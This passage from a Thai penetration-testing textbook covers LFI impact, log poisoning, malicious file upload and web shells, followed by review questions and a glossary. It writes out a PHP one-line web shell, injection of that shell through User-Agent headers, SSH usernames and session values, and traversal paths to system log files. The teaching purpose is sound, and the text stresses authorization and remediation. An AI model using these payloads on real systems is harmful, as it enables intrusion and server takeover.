ในระบบใหม่ วิธีที่ใช้ได้คือการเลือกตัวห่อที่ไม่มีปัญหานามสกุล หรือหาจุดที่แอปพลิเคชันเขียนไฟล์ได้แล้วจึงใช้ LFI เรียกไฟล์นั้น ซึ่งเป็นแนวคิดที่จะกล่าวถึงในหัวข้อถัดไป

ผลกระทบที่ต้องประเมิน

การอ่านไฟล์ระบบหนึ่งไฟล์อาจดูเหมือนเรื่องเล็ก แต่ผลกระทบที่ตามมาสามารถขยายได้หลายทาง การอ่านไฟล์ค่าตั้งมักเปิดเผยข้อมูลรับรองของฐานข้อมูล ซึ่งนำไปสู่การเข้าถึงข้อมูลทั้งระบบ การอ่านซอร์สโค้ดเปิดเผยตรรกะการตรวจสอบสิทธิ์และจุดที่ยังมีช่องโหว่อื่น การอ่านไฟล์บันทึกอาจเปิดเผยโทเคนของผู้อื่น

ในรายงานผลการทดสอบ ควรระบุให้ชัดว่าไฟล์ใดถูกอ่านได้ ข้อมูลใดอยู่ในไฟล์นั้น และข้อมูลนั้นนำไปสู่อะไรได้บ้าง การเขียนเพียงว่า "พบ LFI" ไม่เพียงพอต่อการตัดสินใจของผู้ว่าจ้าง เพราะไม่บอกว่าควรแก้ไขด้วยความเร่งด่วนเพียงใด

ข้อควรระวังในการทดสอบคือการอ่านไฟล์ที่มีข้อมูลส่วนบุคคลของผู้อื่น แม้จะทำได้ในทางเทคนิค แต่การเก็บหรือเผยแพร่ข้อมูลเหล่านั้นอาจผิดกฎหมายและผิดจริยธรรม ผู้ทดสอบควรพิสูจน์ว่าอ่านได้ด้วยไฟล์ที่ไม่มีความอ่อนไหว เช่น ไฟล์บัญชีผู้ใช้ของระบบ แล้วหยุดเพียงเท่านั้น เว้นแต่ได้รับอนุญาตชัดเจนให้ดำเนินการต่อ

6.6 จากการอ่านไฟล์สู่การสั่งให้ระบบทำงาน

สองเงื่อนไขที่ต้องมาบรรจบกัน

การอ่านไฟล์เป็นข้อมูล แต่การสั่งให้ระบบทำงานต้องมีเงื่อนไขสองข้อมาบรรจบกัน ข้อแรกคือต้องมีไฟล์ที่ผู้ทดสอบสามารถกำหนดเนื้อหาได้ และข้อที่สองคือไฟล์นั้นต้องถูกนำไปประมวลผลโดยตัวแปลภาษา

ในระบบที่ออกแบบดี เงื่อนไขสองข้อนี้ไม่เกิดร่วมกัน ไฟล์ที่ผู้ใช้เขียนได้อยู่ในไดเรกทอรีที่ประมวลผลไม่ได้ และไฟล์ที่ประมวลผลได้อยู่ในไดเรกทอรีที่ผู้ใช้เขียนไม่ได้ การแยกสองส่วนนี้คือการป้องกันชั้นพื้นฐานที่สุด

แต่ในระบบจริงมีไฟล์จำนวนหนึ่งที่ถูกเขียนโดยกระบวนการของระบบเองและอยู่ในที่ที่โปรแกรมอื่นอ่านได้ ไฟล์บันทึก (Log) คือตัวอย่างที่ชัดเจนที่สุด เพราะมันถูกออกแบบมาให้บันทึกข้อมูลจากภายนอกโดยตรง และเนื้อหาที่บันทึกนั้นควบคุมได้บางส่วนจากผู้ส่งคำขอ

Log Poisoning คือเทคนิคที่ผู้ทดสอบเขียนโค้ดที่ต้องการลงในไฟล์บันทึกผ่านช่องทางที่ระบบบันทึกโดยอัตโนมัติ แล้วใช้ช่องโหว่ LFI เรียกไฟล์บันทึกนั้นให้ถูกประมวลผล

ไฟล์บันทึกที่ถูกเขียนโดยคำขอของเรา

ทุกครั้งที่ผู้ใช้ส่งคำขอ เว็บเซิร์ฟเวอร์จะบันทึกข้อมูลบางส่วนลงไฟล์ ข้อมูลที่บันทึกประกอบด้วยที่อยู่ไคลเอนต์ เวลา วิธี เส้นทาง รหัสสถานะ และหัวข้อ User-Agent ค่าหลังนี้มาจากไคลเอนต์โดยตรงและแทบไม่มีการตรวจสอบ

เมื่อผู้ทดสอบส่งคำขอที่มีโค้ด PHP อยู่ในหัวข้อ User-Agent โค้ดนั้นจะถูกเขียนลงไฟล์บันทึกเป็นข้อความธรรมดา จากนั้นเมื่อ LFI เรียกไฟล์บันทึกนั้น ตัวแปลภาษา PHP จะอ่านทั้งไฟล์และประมวลผลส่วนที่เป็นแท็ก PHP

GET / HTTP/1.1
Host: shop.example.local
User-Agent: <?php system($_GET['c']); ?>

ไฟล์บันทึกที่ได้จะมีลักษณะดังนี้

192.0.2.50 - - [12/Nov/2026:09:14:22 +0000] "GET / HTTP/1.1" 200 512 "-" "<?php system($_GET['c']); ?>"

เมื่อเรียกผ่านช่องโหว่ LFI ด้วยค่า ../../../../var/log/apache2/access.log และส่งพารามิเตอร์ c=id ตามไปด้วย ระบบจะรันคำสั่ง id และส่งผลลัพธ์กลับมาในหน้าเดียวกับที่ควรแสดงเนื้อหาไฟล์

ตำแหน่งไฟล์บันทึกที่ต้องรู้

ตำแหน่งไฟล์บันทึกขึ้นกับระบบปฏิบัติการ การติดตั้ง และการตั้งค่าของผู้ดูแล ตารางถัดไปรวบรวมตำแหน่งที่พบบ่อย

ตาราง 6.15 ตำแหน่งไฟล์บันทึกที่พบบ่อย
ระบบไฟล์สิ่งที่บันทึก
Apache บนเดเบียน/อูบุนตู/var/log/apache2/access.logทุกคำขอที่เข้ามา
Apache บน RHEL/CentOS/var/log/httpd/access_logทุกคำขอที่เข้ามา
Apache (error)/var/log/apache2/error.logข้อผิดพลาดและการเรียกไฟล์ที่ไม่พบ
nginx/var/log/nginx/access.logทุกคำขอที่เข้ามา
SSH/var/log/auth.logการเข้าสู่ระบบและการพยายามเข้าสู่ระบบ
SSH บน RHEL/CentOS/var/log/secureการเข้าสู่ระบบและการพยายามเข้าสู่ระบบ
เซสชัน PHP/var/lib/php/sessions/sess_<ตัวระบุ>ข้อมูลเซสชันของผู้ใช้

การเดาตำแหน่งไฟล์บันทึกทำได้จากข้อมูลที่รวบรวมไว้ก่อนหน้า หากหัวข้อ Server บอกว่าเป็น Apache บนอูบุนตู ตำแหน่งแรกที่ควรลองคือ /var/log/apache2/access.log หากเป็น nginx ก็เปลี่ยนเป็น /var/log/nginx/access.log การอ่านไฟล์ค่าเริ่มต้นของระบบปฏิบัติการก็ช่วยได้ เช่น ไฟล์ใต้ /etc/apache2/ หรือ /etc/nginx/ ซึ่งมักระบุเส้นทางบันทึกไว้

ช่องทางเขียนอื่นที่ไม่ใช่ไฟล์บันทึกของเว็บ

ไฟล์บันทึกของ SSH เป็นเป้าหมายอีกแบบหนึ่ง เพราะชื่อผู้ใช้ที่ใช้พยายามเข้าสู่ระบบจะถูกบันทึกไว้ในไฟล์ แม้การเข้าสู่ระบบจะล้มเหลวก็ตาม ผู้ทดสอบจึงสามารถส่งชื่อผู้ใช้ที่มีโค้ด PHP ฝังอยู่ได้

ssh '<?php system($_GET["c"]); ?>'@192.0.2.20

ระบบจะบันทึกบรรทัดว่า Invalid user <?php ... ?> from 192.0.2.50 ลงในไฟล์ /var/log/auth.log หรือ /var/log/secure และเมื่อเรียกไฟล์นั้นผ่าน LFI โค้ดก็จะถูกประมวลผล ข้อจำกัดคือโปรแกรม SSH อาจปฏิเสธชื่อผู้ใช้ที่มีอักขระบางตัว จึงต้องลองรูปแบบที่แตกต่างกัน

ไฟล์เซสชันของ PHP เป็นอีกช่องทางที่ใช้บ่อย เพราะแอปพลิเคชันมักเก็บค่าที่ผู้ใช้กรอกลงในเซสชัน ตัวอย่างเช่น ฟอร์มที่ให้กรอกชื่อเล่นแล้วเก็บไว้ใน $_SESSION['name'] ผู้ทดสอบเพียงกรอกโค้ด PHP ลงในช่องนั้น แล้วเรียกไฟล์เซสชันผ่าน LFI

../../../../var/lib/php/sessions/sess_8f14e45fceea167a5a36dedd4bea2543

รูปแบบภายในไฟล์เซสชันคือชื่อตัวแปรตามด้วยเครื่องหมายขีดตั้ง ความยาว และค่าที่อยู่ในเครื่องหมายคำพูด เช่น name|s:26:"<?php system($_GET['c']); ?>"; ข้อจำกัดคือแอปพลิเคชันอาจกรองอักขระพิเศษก่อนเก็บค่าลงเซสชัน และตัวระบุเซสชันต้องตรงกับของผู้ทดสอบเอง

ช่องทางอื่นที่เคยใช้ได้ในระบบรุ่นเก่า ได้แก่ ไฟล์ /proc/self/environ ซึ่งเก็บค่าสภาพแวดล้อมของกระบวนการ และไฟล์ชั่วคราวที่เกิดจากการอัปโหลด ระบบรุ่นใหม่มักปิดช่องทางเหล่านี้แล้ว แต่การตรวจสอบว่าใช้ได้หรือไม่ยังเป็นส่วนหนึ่งของการทดสอบที่ควรทำ

ลำดับขั้นตอนการทดสอบ

การทดสอบ Log Poisoning มีลำดับที่ชัดเจน หากข้ามขั้นใดจะเสียเวลาโดยไม่จำเป็น

ตาราง 6.16 ลำดับขั้นตอนการทดสอบ Log Poisoning
ลำดับสิ่งที่ทำหลักฐานที่ต้องได้
1ยืนยันว่ามีช่องโหว่อ่านไฟล์อ่านไฟล์ที่ไม่มีความอ่อนไหวได้ เช่น ไฟล์บัญชีผู้ใช้ของระบบ
2ระบุตำแหน่งไฟล์บันทึกอ่านไฟล์บันทึกได้ และเห็นคำขอของตัวเอง
3ตรวจว่าตัวแปลภาษาประมวลผลไฟล์หรือไม่เรียกไฟล์ที่มีแท็ก PHP ทดสอบแล้วเห็นผลลัพธ์
4ฝังโค้ดผ่านหัวข้อหรือช่องทางที่บันทึกเห็นโค้ดในไฟล์บันทึกเมื่ออ่านซ้ำ
5เรียกไฟล์บันทึกพร้อมพารามิเตอร์สั่งงานได้ผลลัพธ์ของคำสั่งที่สั่ง
6บันทึกเวลาและสิ่งที่ทำใช้ลบร่องรอยและรายงานผลได้

ขั้นที่สามเป็นขั้นที่คนมักข้าม เพราะคิดว่าอ่านไฟล์ได้แล้วจะสั่งงานได้ทันที ความจริงคือการอ่านไฟล์กับการประมวลผลเป็นคนละความสามารถ ระบบที่ใช้ฟังก์ชันอ่านไฟล์ธรรมดาจะไม่ประมวลผลโค้ดใดๆ การทดสอบที่ปลอดภัยคือสร้างไฟล์ทดสอบของตัวเองที่มีโค้ดง่ายๆ แล้วเรียกดูว่าผลลัพธ์ถูกประมวลผลหรือไม่

ข้อจำกัดในระบบรุ่นใหม่

ระบบรุ่นใหม่ปิดช่องทางนี้ด้วยหลายวิธี วิธีแรกคือการทำให้ไฟล์บันทึกอ่านได้เฉพาะผู้ใช้ระดับสูง ซึ่งทำให้เว็บเซิร์ฟเวอร์อ่านไฟล์ไม่ได้ วิธีที่สองคือการแยกไดเรกทอรีบันทึกออกจากพื้นที่ที่สคริปต์เข้าถึงได้ด้วย open_basedir วิธีที่สามคือการเข้ารหัสอักขระควบคุมและเครื่องหมายคำพูดในไฟล์บันทึก ซึ่งทำให้โค้ดที่ฝังไปเสียรูปและไม่ทำงาน

นอกจากนี้ ผู้ให้บริการโฮสติ้งจำนวนมากได้ปิดฟังก์ชัน include แบบรับค่าจากผู้ใช้ หรือเปลี่ยนไปใช้การส่งข้อมูลผ่านเทมเพลตที่ไม่อ่านเส้นทางจากภายนอก การทดสอบจึงต้องเริ่มจากการตรวจว่าช่องโหว่พื้นฐานยังมีอยู่จริงก่อนจะลงทุนกับเทคนิคที่ซับซ้อน

อีกปัจจัยที่สำคัญคือระบบเฝ้าระวัง คำขอที่มีโค้ด PHP ในหัวข้อ User-Agent เป็นรูปแบบที่ผิดปกติอย่างชัดเจน ระบบป้องกันที่ทันสมัยจะบล็อกหรือแจ้งเตือนทันที การทดสอบในระบบที่มีการป้องกันเช่นนี้จึงควรแจ้งผู้ดูแลล่วงหน้า และควรเตรียมพร้อมอธิบายว่าคำขอเหล่านั้นมาจากการทดสอบที่ได้รับอนุญาต

ผลกระทบและความรับผิดชอบ

เมื่อทำได้สำเร็จ ผลลัพธ์คือความสามารถในการสั่งคำสั่งบนเซิร์ฟเวอร์ด้วยสิทธิ์ของเว็บเซิร์ฟเวอร์ ซึ่งมักเทียบเท่ากับการยึดเครื่องได้ทั้งหมด ขึ้นกับสิทธิ์ที่ได้รับและมาตรการแบ่งแยกที่เหลืออยู่

การทดสอบควรหยุดที่การพิสูจน์ว่าสั่งงานได้ เช่น การรันคำสั่งที่แสดงชื่อผู้ใช้ปัจจุบัน แล้วบันทึกผลไว้เป็นหลักฐาน ไม่ควรติดตั้งเครื่องมือเพิ่ม ไม่ควรอ่านข้อมูลของผู้ใช้ และไม่ควรแก้ไขไฟล์ของระบบ การกระทำเกินกว่านั้นเพิ่มความเสี่ยงโดยไม่เพิ่มคุณค่าของรายงาน

สิ่งที่ต้องทำหลังการทดสอบคือการลบร่องรอยที่สร้างขึ้น โดยเฉพาะไฟล์ที่อัปโหลดและค่าที่เขียนลงเซสชัน ส่วนไฟล์บันทึกมักไม่สามารถแก้ไขได้โดยตรง แต่ควรแจ้งผู้ดูแลระบบถึงช่วงเวลาและรูปแบบของคำขอที่ใช้ เพื่อให้ตรวจสอบและล้างข้อมูลได้ตามกระบวนการขององค์กร

6.7 การอัปโหลดไฟล์อันตราย

ฟีเจอร์ที่กลายเป็นช่องโหว่

เว็บแอปพลิเคชันแทบทุกตัวมีฟีเจอร์รับไฟล์จากผู้ใช้ ระบบสารบรรณรับไฟล์เอกสาร ระบบขายสินค้ารับรูปสินค้า ระบบสมัครงานรับเรซูเม่ และระบบแสดงความคิดเห็นรับรูปประกอบ ฟีเจอร์เหล่านี้จำเป็นต่อการใช้งานจริงและปิดไม่ได้

ความเสี่ยงเกิดขึ้นเมื่อไฟล์ที่รับเข้ามาถูกเก็บไว้ในตำแหน่งที่ผู้ใช้เข้าถึงได้ และเซิร์ฟเวอร์ยินดีประมวลผลไฟล์นั้นตามนามสกุล ผู้โจมตีจึงไม่ต้องหาช่องโหว่อื่นอีกต่อไป แต่เพียงอัปโหลดไฟล์ที่มีโค้ดแล้วเรียกไฟล์นั้นผ่านเบราว์เซอร์

ช่องโหว่นี้ให้ผลที่หนักกว่าช่องโหว่อื่นในบทนี้ เพราะผู้โจมตีควบคุมเนื้อหาไฟล์ได้ทั้งหมด ไม่ต้องอาศัยไฟล์ของระบบหรือการเขียนผ่านช่องทางอ้อม และเมื่อสำเร็จแล้วมักคงอยู่ถาวรจนกว่าจะมีผู้ลบไฟล์ออก

ชั้นการตรวจที่ควรมี

การป้องกันการอัปโหลดไฟล์อันตรายต้องอาศัยหลายชั้นร่วมกัน ไม่มีชั้นใดชั้นเดียวที่เพียงพอ ตารางถัดไปสรุปชั้นที่ควรมีและจุดที่มักบกพร่อง

ตาราง 6.17 ชั้นการตรวจการอัปโหลดและจุดที่มักบกพร่อง
ชั้นการตรวจกลไกจุดที่มักบกพร่อง
ฝั่งไคลเอนต์จำกัดนามสกุลในช่องเลือกไฟล์แก้ไขคำขอได้ด้วยพร็อกซี
หัวข้อชนิดข้อมูลตรวจ Content-Type ที่ส่งมาค่านี้ไคลเอนต์กำหนดเองได้
นามสกุลไฟล์ตรวจรายการที่อนุญาตตรวจไม่ครบทุกนามสกุลที่เซิร์ฟเวอร์รู้จัก
เนื้อหาไฟล์ตรวจไบต์เริ่มต้นหรือขนาดภาพตรวจเพียงค่าเริ่มต้นแต่ไม่ตรวจทั้งไฟล์
การเปลี่ยนชื่อไฟล์สร้างชื่อใหม่แบบสุ่มยังเก็บในไดเรกทอรีที่เข้าถึงได้
ตำแหน่งจัดเก็บเก็บนอกไดเรกทอรีเว็บเก็บในไดเรกทอรีเดียวกับหน้าเว็บ
การปิดการประมวลผลปิดการรันสคริปต์ในไดเรกทอรีอัปโหลดตั้งค่าไม่ครอบคลุมทุกนามสกุล
การประมวลผลซ้ำสร้างภาพใหม่จากข้อมูลที่รับทำเฉพาะบางประเภทไฟล์

ข้อบกพร่องที่พบบ่อยที่สุดคือการตรวจชั้นแรกเพียงชั้นเดียว ผู้พัฒนาหลายคนเชื่อว่าการจำกัดนามสกุลในช่องเลือกไฟล์คือการป้องกันที่เพียงพอ ทั้งที่ผู้ใช้สามารถส่งคำขอเองโดยไม่ผ่านหน้าเว็บได้เลย การตรวจฝั่งไคลเอนต์มีไว้เพื่อประสบการณ์ของผู้ใช้ ไม่ใช่เพื่อความปลอดภัย

ข้อบกพร่องที่พบบ่อยรองลงมาคือการตรวจรายการนามสกุลที่ห้าม (Blacklist) ซึ่งมักลืมนามสกุลที่เซิร์ฟเวอร์รู้จักอีกหลายตัว การตรวจรายการที่อนุญาต (Whitelist) จึงปลอดภัยกว่า เพราะไฟล์ที่ไม่ตรงรายการจะถูกปฏิเสธทั้งหมด

เทคนิคหลบการตรวจที่พบบ่อย

แนวคิดของเว็บเชลล์

เว็บเชลล์คือสคริปต์ที่รับคำสั่งจากผู้ใช้และส่งผลลัพธ์กลับมา ชื่อเรียกนี้ไม่ได้หมายถึงไฟล์ชนิดใดชนิดหนึ่ง แต่หมายถึงบทบาทของไฟล์นั้น เมื่อถูกเรียกผ่านเบราว์เซอร์ มันจะทำหน้าที่เป็นช่องทางควบคุมเซิร์ฟเวอร์

เว็บเชลล์ที่สั้นที่สุดสำหรับ PHP มีเพียงบรรทัดเดียว

<?php system($_GET['c']); ?>

ไฟล์นี้รับค่าจากพารามิเตอร์ c แล้วรันเป็นคำสั่งของระบบปฏิบัติการ ผลลัพธ์จะถูกส่งกลับไปยังเบราว์เซอร์ ข้อดีของรูปแบบสั้นคือตรวจพบได้ยากกว่าไฟล์ที่มีโค้ดจำนวนมาก แต่ก็ยังคงถูกตรวจจับได้ด้วยกฎการตรวจจับที่รู้จักรูปแบบนี้

ในการทดสอบจริง ไม่จำเป็นต้องใช้เว็บเชลล์ที่สามารถทำได้ทุกอย่าง เครื่องมือสำเร็จรูปที่มีผู้เผยแพร่ทั่วไปมักมีโค้ดจำนวนมาก ฟีเจอร์ที่ไม่จำเป็น และบางครั้งมีโค้ดที่เป็นอันตรายแอบแฝง การใช้สคริปต์สั้นๆ ที่เขียนเองเพื่อพิสูจน์ว่าสั่งงานได้จึงปลอดภัยกว่าและเพียงพอต่อการรายงานผล

วิธีที่ปลอดภัยที่สุดคือการอัปโหลดไฟล์ที่ไม่มีคำสั่งใดๆ แต่มีข้อความระบุตัวตนที่ไม่ซ้ำใคร

<?php echo "PROOF-2026-11-12-7f3a9c"; ?>

เมื่อเรียกไฟล์นี้แล้วเห็นข้อความนั้น แสดงว่าเซิร์ฟเวอร์ประมวลผลไฟล์ที่อัปโหลดได้จริง หลักฐานนี้เพียงพอที่จะยืนยันช่องโหว่โดยไม่ต้องรันคำสั่งใดบนระบบ และไม่มีผลข้างเคียงให้ต้องกังวล

ลำดับการทดสอบ

การทดสอบการอัปโหลดควรทำอย่างเป็นลำดับ เพื่อให้รู้ว่าแต่ละชั้นการป้องกันทำงานอย่างไร

เริ่มจากอัปโหลดไฟล์ปกติที่ระบบควรยอมรับ แล้วสังเกตว่าไฟล์ถูกเก็บที่ใดและเข้าถึงได้ด้วยที่อยู่แบบใด การรู้ตำแหน่งจัดเก็บเป็นสิ่งจำเป็น เพราะไฟล์ที่อัปโหลดสำเร็จแต่เข้าถึงไม่ได้ก็ไม่เป็นประโยชน์

จากนั้นลองอัปโหลดไฟล์ที่มีนามสกุลต้องห้าม แล้วดูว่าคำตอบเปลี่ยนอย่างไร ระบบที่ตอบข้อความผิดพลาดชัดเจนจะบอกใบ้ว่ากำลังตรวจอะไร ระบบที่ตอบเหมือนเดิมทุกกรณีจะต้องอาศัยการสังเกตที่ละเอียดขึ้น

ขั้นถัดไปคือการลองนามสกุลทางเลือก การเปลี่ยนหัวข้อชนิดข้อมูล และการเติมไบต์เริ่มต้นของภาพ ทำทีละอย่างและบันทึกผล เพราะการเปลี่ยนหลายอย่างพร้อมกันจะทำให้ไม่รู้ว่าอะไรได้ผล

ขั้นสุดท้ายคือการเรียกไฟล์ที่อัปโหลดผ่านเบราว์เซอร์ หากเห็นผลลัพธ์ที่ประมวลผลแล้ว แสดงว่าสำเร็จ หากเห็นโค้ดต้นฉบับเป็นข้อความ แสดงว่าไฟล์ถูกเก็บในที่ที่ไม่อนุญาตให้ประมวลผล ซึ่งยังเป็นข้อบกพร่องด้านอื่นแต่ไม่ใช่ช่องโหว่ที่จะนำไปสั่งงานได้

มาตรการแก้ไขที่ควรเสนอ

เมื่อพบช่องโหว่นี้ รายงานควรเสนอมาตรการที่ตรงกับสาเหตุ ไม่ใช่เพียงบอกให้ตรวจนามสกุลให้ดีขึ้น มาตรการที่ได้ผลจริงมีสี่ข้อ

ข้อแรกคือการเปลี่ยนชื่อไฟล์เป็นค่าสุ่มที่ไม่มีความหมายและไม่คงนามสกุลเดิมของผู้ใช้ วิธีนี้ตัดความสามารถในการเดาที่อยู่ของไฟล์และตัดการพึ่งพานามสกุลของผู้ใช้

ข้อที่สองคือการเก็บไฟล์นอกไดเรกทอรีที่เว็บเสิร์ฟ และส่งผ่านสคริปต์ที่ตรวจสิทธิ์ก่อนทุกครั้ง วิธีนี้ทำให้ไฟล์ที่อันตรายไม่ถูกเรียกโดยตรงได้เลย

ข้อที่สามคือการปิดการประมวลผลสคริปต์ในไดเรกทอรีอัปโหลดอย่างชัดเจน ทั้งในไฟล์ตั้งค่าของเว็บเซิร์ฟเวอร์และในนโยบายของระบบ

ข้อที่สี่คือการตรวจเนื้อหาไฟล์จริงและสร้างภาพใหม่จากข้อมูลที่รับสำหรับไฟล์ภาพ วิธีนี้ลบข้อมูลที่ไม่ใช่ภาพออกทั้งหมด และเป็นมาตรการที่แข็งแรงที่สุดสำหรับกรณีอัปโหลดภาพ

การเสนอมาตรการหลายชั้นพร้อมกันสำคัญ เพราะการพึ่งชั้นใดชั้นเดียวคือสาเหตุที่ช่องโหว่นี้เกิดขึ้นซ้ำในระบบต่างๆ มาหลายทศวรรษ

ขอบเขตและความปลอดภัยในการทดสอบ

การอัปโหลดไฟล์ที่รันคำสั่งได้เป็นการกระทำที่มีความเสี่ยงสูงที่สุดในบทนี้ เพราะไฟล์ที่อัปโหลดจะคงอยู่ในระบบจนกว่าจะมีผู้ลบ และอาจถูกเรียกใช้โดยผู้ที่ไม่หวังดีหากค้นพบก่อน

ผู้ทดสอบต้องได้รับอนุญาตชัดเจนก่อนทำการอัปโหลดใดๆ ที่มีโค้ด และต้องบันทึกที่อยู่ของไฟล์ที่อัปโหลดไว้ทุกไฟล์เพื่อลบในภายหลัง หากไม่สามารถลบได้ด้วยตัวเอง ต้องแจ้งผู้ดูแลระบบพร้อมที่อยู่และเวลาที่แน่นอน

การทดสอบกับเว็บไซต์ที่ไม่ได้อยู่ในขอบเขตเป็นการกระทำผิดกฎหมายในหลายประเทศ แม้จะเป็นเพียงการอัปโหลดไฟล์ข้อความธรรมดาก็ตาม การทดลองทั้งหมดในบทนี้จึงควรทำในเครื่องเสมือนที่จัดเตรียมไว้สำหรับฝึกเท่านั้น

6.8 การประกอบทุกส่วนเป็นการทดสอบหนึ่งรอบ

จากความเข้าใจรายส่วนสู่ลำดับงาน

หัวข้อ 6.1 ถึง 6.7 อธิบายส่วนประกอบแต่ละส่วนของงานแยกจากกัน แต่การทดสอบจริงต้องทำหลายส่วนต่อเนื่องกัน และลำดับที่เลือกมีผลต่อคุณภาพของผลลัพธ์อย่างมาก การเริ่มต้นที่ถูกต้องคือการสำรวจให้เห็นภาพรวมก่อน แล้วจึงเลือกจุดที่คุ้มค่าที่สุดในการลงลึก

หลักการที่ใช้คือ เก็บข้อมูลให้กว้างก่อน ลงลึกเฉพาะจุดที่มีหลักฐานสนับสนุน การลงลึกกับทุกพารามิเตอร์ที่พบเป็นสิ่งที่เป็นไปไม่ได้ในระบบขนาดจริง และการลงลึกกับจุดที่เลือกโดยไม่มีเหตุผลรองรับก็มักเสียเวลาโดยไม่พบอะไร

ข้อ 1เพราะเหตุใดจึงกล่าวว่าช่องโหว่ของเว็บมักอยู่ในตรรกะของแอปพลิเคชันมากกว่าตัวเซิร์ฟเวอร์ และข้อเท็จจริงนี้ส่งผลต่อประสิทธิภาพของเครื่องมือสแกนอัตโนมัติอย่างไร
ข้อ 2จงอธิบายความแตกต่างระหว่างรหัสสถานะ 401 กับ 403 และยกตัวอย่างว่าการเห็นรหัสทั้งสองแบบบนเส้นทางเดียวกันให้ข้อมูลอะไรแก่ผู้ทดสอบ
ข้อ 3เหตุใดการอ่านคำขอในรูปดิบจึงให้ข้อมูลมากกว่าการดูหน้าเว็บ และหัวข้อใดบ้างที่มักให้ข้อมูลเกี่ยวกับสถาปัตยกรรมของระบบ
ข้อ 4จงอธิบายความหมายของคุณสมบัติ HttpOnly, Secure และ SameSite ของคุกกี้ พร้อมระบุว่าคุณสมบัติใดป้องกันการขโมยเซสชันได้ในสถานการณ์ใด
ข้อ 5เพราะเหตุใดการตั้ง scope ใน Burp Suite จึงไม่เพียงพอต่อการรับประกันว่าจะไม่ทดสอบนอกขอบเขต และผู้ทดสอบต้องสร้างวินัยอะไรเพิ่มเติม
ข้อ 6จงอธิบายความแตกต่างระหว่าง Path Traversal กับ LFI และยกตัวอย่างสถานการณ์ที่ทั้งสองอย่างเกิดจากช่องโหว่เดียวกัน
ข้อ 7เพราะเหตุใด Log Poisoning จึงต้องมีเงื่อนไขสองข้อมาบรรจบกัน และข้อจำกัดใดในระบบรุ่นใหม่ที่ทำให้เทคนิคนี้ใช้ไม่ได้
ข้อ 8หากพบว่าฟีเจอร์อัปโหลดตรวจเฉพาะนามสกุลไฟล์ จงอธิบายมาตรการแก้ไขอย่างน้อยสามข้อที่ควรเสนอ พร้อมเหตุผลว่าทำไมการเพิ่มรายการนามสกุลที่ห้ามจึงไม่เพียงพอ

Aa คำศัพท์สำคัญ

คำศัพท์คำอธิบาย
โปรโตคอล HTTP (Hypertext Transfer Protocol)โปรโตคอลที่เบราว์เซอร์และเว็บเซิร์ฟเวอร์ใช้สนทนากัน
คำขอ (Request)ข้อความที่ไคลเอนต์ส่งไปยังเซิร์ฟเวอร์ ประกอบด้วยบรรทัดคำขอ หัวข้อ และตัวข้อมูล
คำตอบ (Response)ข้อความที่เซิร์ฟเวอร์ส่งกลับ ประกอบด้วยบรรทัดสถานะ หัวข้อ และตัวข้อมูล
หัวข้อ (Header)ส่วนที่ระบุข้อมูลประกอบของคำขอหรือคำตอบ อยู่ในรูปชื่อกับค่า
รหัสสถานะ (Status Code)ตัวเลขสามหลักที่บอกผลของคำขอ
คุกกี้ (Cookie)ข้อมูลขนาดเล็กที่เซิร์ฟเวอร์ให้ไคลเอนต์เก็บไว้และส่งกลับมาทุกครั้ง
เซสชัน (Session)สถานะการสนทนาต่อเนื่องที่เซิร์ฟเวอร์จำได้ว่ามาจากผู้ใช้คนเดียวกัน
ตัวระบุเซสชัน (Session ID)ค่าที่ใช้ชี้เซสชันหนึ่งๆ เปรียบเสมือนกุญแจของเซสชัน
ขอบเขตความไว้วางใจ (Trust Boundary)เส้นแบ่งระหว่างข้อมูลที่เชื่อถือได้และเชื่อถือไม่ได้
พร็อกซีแบบดักจับ (Intercepting Proxy)เครื่องมือที่วางตัวระหว่างไคลเอนต์กับเซิร์ฟเวอร์เพื่อหยุดและแก้ไขข้อมูล
ขอบเขตงาน (Scope)ชุดของระบบ โดเมน และที่อยู่ที่ได้รับอนุญาตให้ทดสอบ
การค้นหาเนื้อหา (Content Discovery)กระบวนการหาเส้นทางและไฟล์ที่ไม่ได้เชื่อมโยงจากหน้าแรก
รายการคำ (Wordlist)ไฟล์รายการคำที่ใช้ให้เครื่องมือลองแทนที่ในตำแหน่งที่กำหนด
ผลบวกลวง (False Positive)ผลที่เครื่องมือรายงานว่าพบ ทั้งที่ไม่มีอยู่จริง
ไดเรกทอรี (Directory)ที่เก็บไฟล์ในระบบไฟล์ ทำหน้าที่เหมือนโฟลเดอร์
การเดินถอยหลังไดเรกทอรี (Path Traversal)การใช้เครื่องหมาย .. เพื่อเข้าถึงไฟล์นอกไดเรกทอรีที่กำหนด
การอ้างอิงไฟล์ภายในเครื่อง (Local File Inclusion)การที่ผู้ใช้กำหนดไฟล์ในเซิร์ฟเวอร์เดียวกันให้ถูกนำไปประมวลผล
การอ้างอิงไฟล์จากระยะไกล (Remote File Inclusion)การที่ผู้ใช้กำหนดไฟล์จากเซิร์ฟเวอร์อื่นให้ถูกนำไปประมวลผล
ตัวห่อ (Wrapper)กลไกของ PHP ที่เปลี่ยนวิธีการเข้าถึงแหล่งข้อมูล
ไฟล์บันทึก (Log)ไฟล์ที่ระบบเขียนข้อมูลเหตุการณ์ลงไปโดยอัตโนมัติ
การฝังโค้ดในไฟล์บันทึก (Log Poisoning)เทคนิคเขียนโค้ดลงไฟล์บันทึกแล้วเรียกให้ถูกประมวลผล
เว็บเชลล์ (Web Shell)สคริปต์ที่รับคำสั่งและส่งผลลัพธ์กลับผ่านเว็บ
ไบต์เริ่มต้น (Magic Bytes)ไบต์ชุดแรกของไฟล์ที่ใช้ระบุชนิดไฟล์
ไฟล์ลูกผสม (Polyglot)ไฟล์ที่ถูกต้องตามรูปแบบมากกว่าหนึ่งชนิดในเวลาเดียวกัน
รายการที่อนุญาต (Whitelist)แนวทางตรวจที่ยอมรับเฉพาะค่าที่ระบุไว้
รายการที่ห้าม (Blacklist)แนวทางตรวจที่ปฏิเสธค่าที่ระบุไว้
การประมวลผลซ้ำ (Re-encode)การสร้างไฟล์ภาพใหม่จากข้อมูลที่รับ ซึ่งลบข้อมูลที่ไม่ใช่ภาพออก
การเขียนทับด้วยค่าศูนย์ (Null Byte)อักขระที่ใช้ตัดสายอักขระในระบบรุ่นเก่า และถูกปิดช่องทางแล้วใน PHP 5.3.4
ฐานหกสิบสี่ (Base64)การเข้ารหัสข้อมูลเป็นข้อความที่ใช้ถอดกลับได้
ข้อกำหนดการเข้าถึงไดเรกทอรี (open_basedir)ค่าตั้งของ PHP ที่จำกัดไดเรกทอรีที่สคริปต์เข้าถึงได้

